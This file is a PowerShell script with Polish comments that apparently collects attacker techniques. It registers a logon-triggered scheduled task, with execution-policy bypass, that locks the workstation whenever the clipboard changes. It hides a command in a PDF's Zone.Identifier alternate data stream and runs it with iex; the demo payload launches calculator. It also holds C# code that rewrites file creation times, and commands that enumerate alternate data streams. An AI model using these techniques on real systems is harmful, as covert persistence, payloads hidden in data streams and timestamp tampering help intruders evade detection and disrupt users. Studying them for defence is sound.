#It Locks the Sesion whenever user use a clipboard
$previousClipboardContent = Get-Clipboard -Format Text
while ($previousClipboardContent -eq (Get-Clipboard -Format Text)){
    
}

$currentClipboardContent = Get-Clipboard -Format Text

while (1) {
    $currentClipboardContent = Get-Clipboard -Format Text

    if ($currentClipboardContent -ne $previousClipboardContent) {
        [void](Add-Type -m '[DllImport("user32.dll")]public static extern bool LockWorkStation();' -Name "Lock" -pas)::LockWorkStation()

        $previousClipboardContent = $currentClipboardContent
    }

    Start-Sleep -Seconds 1
}

#previous script as a task
$skryptPath = @'
$previousClipboardContent = Get-Clipboard -Format Text
while ($previousClipboardContent -eq (Get-Clipboard -Format Text)) { }

$currentClipboardContent = Get-Clipboard -Format Text
while (1) {
    $currentClipboardContent = Get-Clipboard -Format Text
    if ($currentClipboardContent -ne $previousClipboardContent) {
        [void](Add-Type -m '[DllImport("user32.dll")]public static extern bool LockWorkStation();' -Name "Lock" -pas)::LockWorkStation()
        $previousClipboardContent = $currentClipboardContent
    }
    Start-Sleep -Seconds 1
}
'@
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $skryptPath
$trigger = New-ScheduledTaskTrigger -AtLogOn

Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "UruchomienieSkryptuNaStart"

#ustawienie metadanych pliku na cmdlt otwierający kalkulator
sc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier @"
saps calc
"@

#wywołanie polecenia z metadanych pliku
gc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier | iex

#usunięcie metadanych z pliku
gc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier | ri

#wyświetlenie metadanych pliku z pulpitu
gci $home\Desktop\ | % {gc $_.FullName -ea Si -s Zone.Identifier}

#poniższy skrypt wywołuje skrypt c# tak, żeby każdorazowe otwarcie pliku powodowało zmianę daty stworzenia pliku
$csharpCode = @'
using System;
using System.IO;

public class TimeChanger
{
    public static void Changer()
    {
        string path = @"C:\Users\mzkwcim\Desktop\CzasoZmieniacz.txt";
        var creationTime = File.GetCreationTime(path);
        var timer = new System.Timers.Timer();
        timer.Interval = 3000;
        timer.Elapsed += (s, e) => {
            var lastAccess = File.GetLastAccessTime(path);
            if (lastAccess > creationTime) {
                File.SetCreationTime(path, lastAccess);
            }
        };
        timer.Start();
        while (timer.Enabled) ;
    }
}
'@

Add-Type -TypeDefinition $csharpCode -Language CSharp

[TimeChanger]::Changer()

#przeszukanie danego folderu z plikami z alternatywnym datastreamem
gci | % {gi $_.FullName -s * | where {($_.Stream | sls -N "Data")} | select filename, stream}


